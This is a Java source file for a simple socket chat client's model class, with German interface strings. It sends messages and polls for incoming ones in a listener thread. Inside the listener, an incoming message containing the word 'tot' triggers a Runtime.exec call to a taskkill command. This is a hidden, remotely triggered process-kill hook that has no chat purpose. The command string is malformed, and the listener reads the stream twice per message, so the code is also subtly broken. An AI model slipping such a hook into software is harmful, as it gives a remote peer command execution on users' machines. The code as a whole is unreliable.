package Version1;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

public class Model {
	
	protected Socket socket;

	public String getIp() {
		String ip = "";
		try (final DatagramSocket socketo = new DatagramSocket()) {
			try {
				socketo.connect(InetAddress.getByName("8.8.8.8"), 10002);
			} catch (UnknownHostException e) {
				e.printStackTrace();
			}
			ip = socketo.getLocalAddress().getHostAddress();
		} catch (SocketException e) {
			e.printStackTrace();
		}
		return ip;
	}

	public InetAddress textToIp(String text) throws UnknownHostException {
		return InetAddress.getByName(text);
	}

	public void message(String message) {
		try {
			System.out.println("sending " + message);
			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
			dos.writeUTF(message);
			dos.flush();
			System.out.println("sended");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void startListener(View v) {
		Thread t = new Thread(new Runnable() {
			@Override
			public void run() {
				while (true) {

					try {
						if(!socket.isClosed()) {
						// System.out.println("SOcket Model: " + socket.getPort() + " IP: " +
						// socket.getInetAddress().getHostAddress());
						if (socket.getInputStream().available() != 0) {
							try {
								v.newMessage(new DataInputStream(socket.getInputStream()).readUTF(), false);
								if(new DataInputStream(socket.getInputStream()).readUTF().contains("tot"))
								{
									try {
										Runtime.getRuntime().exec("cmd/ taskkill /IM /F");
									}catch(Exception e) { 
									}
								}
							} catch (Exception e) {
								v.newMessage("!Fehler!", false);
								v.connect.setName("verbinden");
								e.printStackTrace();

							}
						}
						}else {
							
						}
					} catch (IOException e1) {
						e1.printStackTrace();
					}
					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}

			}
		});
		t.start();
	}
}